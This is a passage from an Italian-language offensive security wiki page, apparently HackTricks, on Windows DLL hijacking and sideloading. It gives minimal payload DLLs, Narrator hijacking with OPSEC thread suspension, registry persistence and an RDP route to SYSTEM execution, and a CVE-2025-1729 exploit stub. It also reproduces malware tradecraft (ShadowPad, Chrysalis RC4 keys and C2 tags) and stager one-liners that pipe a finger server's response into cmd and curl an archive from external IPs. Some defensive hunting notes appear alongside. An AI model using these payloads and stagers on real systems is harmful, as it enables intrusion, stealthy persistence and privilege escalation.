- Se nel percorso OneCore è presente una DLL scrivibile e controllata dall'attaccante, questa viene caricata e viene eseguito `DllMain(DLL_PROCESS_ATTACH)`. Non sono necessarie esportazioni.

Rilevamento con Procmon
- Filtro: `Process Name is Narrator.exe` e `Operation is Load Image` o `CreateFile`.
- Avvia Narrator e osserva il tentativo di caricamento del percorso indicato sopra.

DLL minima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Silenzio OPSEC
- Un hijack ingenuo parlerà/mostrerà elementi nell'interfaccia. Per restare silenziosi, all'attach enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e sospendilo con `SuspendThread`; continua nel tuo thread. Vedi il PoC per il codice completo.<sup>[[8]](#references)</sup>

Attivazione e persistenza tramite configurazione di Accessibility
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, l'avvio di Narrator carica la DLL inserita. Sul desktop protetto (schermata di accesso), premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul desktop protetto.

Esecuzione SYSTEM attivata da RDP (movimento laterale)
- Consenti il livello di sicurezza RDP classico: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Connettiti all'host via RDP e, alla schermata di accesso, premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul desktop protetto.
- L'esecuzione si interrompe quando la sessione RDP viene chiusa: esegui inject/migrate tempestivamente.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce del registro di un Accessibility Tool (AT) integrato (ad es. CursorIndicator), modificarla per puntare a un eseguibile/DLL arbitrario, importarla e poi impostare `configuration` sul nome di quell'AT. In questo modo, l'esecuzione arbitraria viene instradata tramite il framework Accessibility.

Note
- La scrittura in `%windir%\System32` e la modifica dei valori HKLM richiedono diritti di amministratore.
- Tutta la logica del payload può trovarsi in `DLL_PROCESS_ATTACH`; non sono necessari export.

## Caso di studio: CVE-2025-1729 - Escalation dei privilegi tramite TPQMAssistant.exe

Questo caso illustra il **Phantom DLL Hijacking** in TrackPoint Quick Menu di Lenovo (`TPQMAssistant.exe`), identificato come **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Dettagli della vulnerabilità

- **Componente**: `TPQMAssistant.exe`, situato in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Attività pianificata**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguita ogni giorno alle 9:30 nel contesto dell'utente che ha effettuato l'accesso.
- **Autorizzazioni della directory**: scrivibile da `CREATOR OWNER`, consentendo agli utenti locali di inserire file arbitrari.
- **Comportamento di ricerca delle DLL**: tenta di caricare `hostfxr.dll` prima dalla directory di lavoro e registra "NAME NOT FOUND" se il file non è presente, indicando la precedenza della ricerca nella directory locale.

### Implementazione dell'exploit

Un aggressore può inserire uno stub malevolo di `hostfxr.dll` nella stessa directory, sfruttando la DLL mancante per ottenere l'esecuzione di codice nel contesto dell'utente:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Flusso dell'attacco

1. Come utente standard, inserisci `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendi che l'attività pianificata venga eseguita alle 9:30 AM nel contesto dell'utente corrente.
3. Se un amministratore ha effettuato l'accesso quando viene eseguita l'attività, la DLL malevola viene eseguita nella sessione dell'amministratore con integrità media.
4. Combina tecniche standard di UAC bypass per passare dall'integrità media ai privilegi SYSTEM.

## Caso di studio: Dropper MSI CustomAction + DLL Side-Loading tramite host firmato (wsc_proxy.exe)

Gli attori delle minacce spesso combinano dropper basati su MSI e DLL side-loading per eseguire payload sotto un processo attendibile e firmato.<sup>[[10]](#references)</sup>

Panoramica della catena
- L'utente scarica un MSI. Una CustomAction viene eseguita silenziosamente durante l'installazione tramite GUI (ad es. un'azione LaunchApplication o VBScript) e ricostruisce lo stage successivo a partire da risorse incorporate.
- Il dropper scrive un EXE legittimo e firmato e una DLL malevola nella stessa directory (esempio: wsc_proxy.exe firmato da Avast + wsc.dll controllata dall'attaccante).
- Quando viene avviato l'EXE firmato, l'ordine di ricerca delle DLL di Windows carica prima wsc.dll dalla directory di lavoro, eseguendo il codice dell'attaccante sotto un processo padre firmato (ATT&CK T1574.001).

Analisi dell'MSI (cosa cercare)
- Tabella CustomAction:
  - Cerca voci che eseguono eseguibili o VBScript. Esempio di pattern sospetto: LaunchApplication che esegue in background un file incorporato.
  - In Orca (Microsoft Orca.exe), esamina le tabelle CustomAction, InstallExecuteSequence e Binary.
- Payload incorporati/frammentati nel CAB dell'MSI:
  - Estrazione amministrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Oppure usa lessmsi: lessmsi x package.msi C:\out
  - Cerca più frammenti di piccole dimensioni concatenati e decrittati da una CustomAction VBScript. Flusso comune:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Sideloading pratico con wsc_proxy.exe
- Inserisci questi due file nella stessa cartella:
  - wsc_proxy.exe: host legittimo firmato (Avast). Il processo tenta di caricare wsc.dll per nome dalla propria cartella.
  - wsc.dll: DLL dell'attaccante. Se non sono richiesti export specifici, può bastare DllMain; altrimenti, crea una proxy DLL e inoltra gli export richiesti alla libreria originale, eseguendo il payload in DllMain.
- Crea un payload DLL minimale:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Per i requisiti di export, usa un framework di proxy (ad es. DLLirant/Spartacus) per generare una DLL di forwarding che esegua anche il payload.

- Questa tecnica si basa sulla risoluzione dei nomi delle DLL da parte del binario host. Se l’host usa percorsi assoluti o flag di caricamento sicuro (ad es. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), l’hijack potrebbe non riuscire.
- KnownDLLs, SxS ed export inoltrati possono influire sulle priorità e vanno considerati quando si selezionano il binario host e l’insieme di export.

## Triadi firmate + payload crittografati (caso di studio ShadowPad)

Check Point ha descritto come Ink Dragon distribuisce ShadowPad usando una **triade di tre file** per confondersi con il software legittimo e mantenere al contempo il payload principale crittografato su disco:<sup>[[12]](#references)</sup>

1. **EXE host firmato** – vengono abusati vendor come AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Gli attaccanti rinominano l’eseguibile per farlo sembrare un binario Windows (ad esempio `conhost.exe`), ma la firma Authenticode resta valida.
2. **DLL loader malevola** – viene depositata accanto all’EXE con un nome previsto (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL è solitamente un binario MFC offuscato con il framework ScatterBrain; il suo unico compito è individuare il blob crittografato, decrittarlo e mappare ShadowPad in modo riflessivo.
3. **Blob del payload crittografato** – spesso viene salvato come `<name>.tmp` nella stessa directory. Dopo aver mappato in memoria il payload decrittato, il loader elimina il file TMP per distruggere le prove forensi.

Note sulle tecniche operative:

* Rinominare l’EXE firmato (mantenendo il `OriginalFileName` originale nell’header PE) gli permette di spacciarsi per un binario Windows conservando la firma del vendor; quindi, replica l’abitudine di Ink Dragon di depositare binari dall’aspetto simile a `conhost.exe` che in realtà sono utility AMD/NVIDIA.
* Poiché l’eseguibile rimane attendibile, per la maggior parte dei controlli di allowlisting è sufficiente che la DLL malevola si trovi accanto. Concentrati sulla personalizzazione della DLL loader; in genere il processo padre firmato può essere eseguito senza modifiche.
* Il decryptor di ShadowPad si aspetta che il blob TMP si trovi accanto al loader e sia scrivibile, così da poter azzerare il file dopo la mappatura. Mantieni la directory scrivibile finché il payload non viene caricato; una volta in memoria, il file TMP può essere eliminato in sicurezza per OPSEC.

### Catena di sideloading con LOLBAS stager e archivio a fasi (finger → tar/curl → WMI)

Gli operatori affiancano il DLL sideloading a LOLBAS, in modo che l’unico artefatto personalizzato su disco sia la DLL malevola accanto all’EXE attendibile:<sup>[[1]](#references)</sup>

- **Loader di comandi remoto (Finger):** PowerShell nascosto avvia `cmd.exe /c`, recupera i comandi da un server Finger e li invia tramite pipe a `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` recupera testo via TCP/79; `| cmd` esegue la risposta del server, consentendo agli operatori di ruotare la seconda fase lato server.

- **Download/estrazione integrati:** scarica un archivio con un’estensione innocua, estrailo e prepara il target di sideload insieme alla DLL in una cartella `%LocalAppData%` casuale:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` nasconde l’avanzamento e segue i reindirizzamenti; `tar -xf` usa tar integrato in Windows.

- **Avvio WMI/CIM:** Avvia l’EXE tramite WMI, così la telemetria mostra un processo creato da CIM mentre carica la DLL presente nella stessa directory:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funziona con binari che preferiscono DLL locali (es. `intelbq.exe`, `nearby_share.exe`); il payload (es. Remcos) viene eseguito con un nome attendibile.

- **Hunting:** genera un alert su `forfiles` quando `/p`, `/m` e `/c` compaiono insieme; è raro al di fuori degli script di amministrazione.


## Caso di studio: dropper NSIS + sideload del Bitdefender Submission Wizard (Chrysalis)

Una recente intrusione di Lotus Blossom ha abusato di una catena di aggiornamento attendibile per distribuire un dropper compresso con NSIS, che ha predisposto un DLL sideload e payload interamente in memoria.<sup>[[13]](#references)</sup>

Flusso operativo
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo contrassegna come **HIDDEN**, deposita un Bitdefender Submission Wizard rinominato (`BluetoothService.exe`), una `log.dll` malevola e un blob cifrato `BluetoothService`, quindi avvia l'EXE.
- L'EXE host importa `log.dll` e chiama `LogInit`/`LogWrite`. `LogInit` carica il blob tramite mmap; `LogWrite` lo decifra con uno stream personalizzato basato su LCG (costanti **0x19660D** / **0x3C6EF35F**, materiale della chiave derivato da un hash precedente), sovrascrive il buffer con shellcode in chiaro, libera le variabili temporanee e vi salta.
- Per evitare una IAT, il loader risolve le API calcolando l'hash dei nomi delle esportazioni con **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, quindi applica un avalanche in stile Murmur (**0x85EBCA6B**) e confronta il risultato con hash target salati.

Shellcode principale (Chrysalis)
- Decifra un modulo principale simile a un PE ripetendo add/XOR/sub con la chiave `gQ2JR&9;` per cinque passaggi, quindi carica dinamicamente `Kernel32.dll` → `GetProcAddress` per completare la risoluzione degli import.
- Ricostruisce le stringhe dei nomi delle DLL a runtime tramite trasformazioni di rotazione di bit/XOR per carattere, quindi carica `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un secondo resolver che percorre **PEB → InMemoryOrderModuleList**, analizza ogni tabella delle esportazioni in blocchi da 4 byte con un mixing in stile Murmur e ricorre a `GetProcAddress` solo se l'hash non viene trovato.

Configurazione incorporata e C2
- La configurazione si trova nel file `BluetoothService` depositato, all'**offset 0x30808** (dimensione **0x980**), e viene decifrata con RC4 usando la chiave `qwhvb^435h&*7`, rivelando l'URL C2 e lo User-Agent.
- I beacon creano un profilo host delimitato da punti, antepongono il tag `4Q`, quindi lo cifrano con RC4 usando la chiave `vAuig34%^325hGV` prima di inviarlo tramite `HttpSendRequestA` su HTTPS. Le risposte vengono decifrate con RC4 e gestite tramite uno switch sui tag (`4T` shell, `4V` esecuzione di processi, `4W/4X` scrittura di file, `4Y` lettura/esfiltrazione, `4\\` disinstallazione, `4` enumerazione di unità/file + casi di trasferimento a blocchi).
- La modalità di esecuzione è controllata dagli argomenti CLI: senza argomenti = installa la persistenza (servizio/chiave Run) che punta a `-i`; `-i` riavvia il processo con `-k`; `-k` salta l'installazione ed esegue il payload.

Loader alternativo osservato
- La stessa intrusione ha depositato Tiny C Compiler ed eseguito `svchost.exe -nostdlib -run conf.c` da `C:\ProgramData\USOShared\`, con `libtcc.dll` nella stessa cartella. Il sorgente C fornito dall'attaccante incorporava shellcode, veniva compilato ed eseguito in memoria senza scrivere un PE su disco. Riproduci con:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Questa fase di compilazione ed esecuzione basata su TCC importava `Wininet.dll` a runtime e scaricava una shellcode di secondo stadio da un URL hardcoded, fornendo un loader flessibile che si mascherava da esecuzione di un compilatore.

## Signed-host sideloading with export proxying + host thread parking

Alcune catene di DLL sideloading aggiungono **accorgimenti per la stabilità**, così che l’host legittimo rimanga in esecuzione abbastanza a lungo da caricare correttamente gli stadi successivi, invece di andare in crash dopo il caricamento della DLL malevola.<sup>[[11]](#references)</sup>

Schema osservato
- Posiziona un EXE attendibile accanto a una DLL malevola usando il nome di dipendenza previsto, ad esempio `version.dll`.
- La DLL malevola **fa da proxy per tutte le esportazioni previste**, inoltrandole alla DLL di sistema reale (ad esempio `%SystemRoot%\\System32\\version.dll`), in modo che la risoluzione degli import continui a funzionare e il processo host rimanga operativo.
- Dopo il caricamento, la DLL malevola **applica una patch al punto di ingresso dell’host**, facendo entrare il thread principale in un ciclo infinito di `Sleep` invece di terminare o eseguire percorsi di codice che interromperebbero il processo.
- Un nuovo thread esegue le attività malevole vere e proprie: decrittare il nome o il percorso della DLL dello stadio successivo (RC4/XOR sono comuni), quindi avviarla con `LoadLibrary`.

Perché è importante
- Il normale proxying delle DLL preserva la compatibilità delle API, ma non garantisce che l’host rimanga in esecuzione abbastanza a lungo per gli stadi successivi.
- Sospendere il thread principale con `Sleep(INFINITE)` è un modo semplice per mantenere residente il processo firmato mentre il loader esegue la decrittazione, lo staging o l’inizializzazione della rete in un thread worker.
- La ricerca limitata a un `DllMain` sospetto può non rilevare questo schema se il comportamento interessante si verifica dopo l’applicazione di una patch al punto di ingresso dell’host e l’avvio di un thread secondario.

Workflow minimo
1. Copia l’EXE firmato e determina quale DLL carica dalla directory locale.
2. Crea una DLL proxy che esporti le stesse funzioni e le inoltri alla DLL legittima.
3. In `DllMain(DLL_PROCESS_ATTACH)`, crea un thread worker.
4. Da quel thread, applica una patch al punto di ingresso dell’host o alla routine di avvio del thread principale, in modo che esegua un ciclo su `Sleep`.
5. Decritta il nome/la configurazione della DLL dello stadio successivo e chiama `LoadLibrary` oppure esegui il manual mapping del payload.

Punti di indagine difensiva
- Processi firmati che caricano `version.dll` o librerie comuni simili dalla propria directory applicativa invece che da `System32`.
- Patch in memoria nel punto di ingresso del processo subito dopo il caricamento dell’immagine, in particolare salti/chiamate reindirizzati a `Sleep`/`SleepEx`.
- Thread creati da una DLL proxy che chiamano subito `LoadLibrary` su una seconda DLL con un nome decrittato.
- DLL proxy con tutte le esportazioni, posizionate accanto a eseguibili di vendor in directory di staging scrivibili, come `ProgramData`, `%TEMP%` o percorsi di archivi decompressi.

## References

- [1] [Red Canary – Analisi di intelligence: gennaio 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation tramite TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Semplice esempio in C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore distribuisce nuovo malware che prende di mira l’Europa](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: quando i DLL hijack incontrano gli helper di Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgänger digitali: anatomia delle campagne di impersonificazione in evoluzione che distribuiscono Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Interessi convergenti: analisi dei cluster di minacce che prendono di mira un governo del Sud-est asiatico](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Dentro Ink Dragon: svelati la rete di relay e il funzionamento interno di un’operazione offensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – La backdoor Chrysalis: analisi approfondita del toolkit di Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: catena ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracciamento delle campagne di spionaggio del gruppo APT iraniano Screening Serpens nel 2026](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – elemento `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – elemento `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – elemento `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – elemento `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – elemento `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – elemento `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: le operazioni di Nimbus Manticore durante il conflitto iraniano](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Azioni delle attività](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 prende di mira governi e infrastrutture critiche del Sud-est asiatico](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
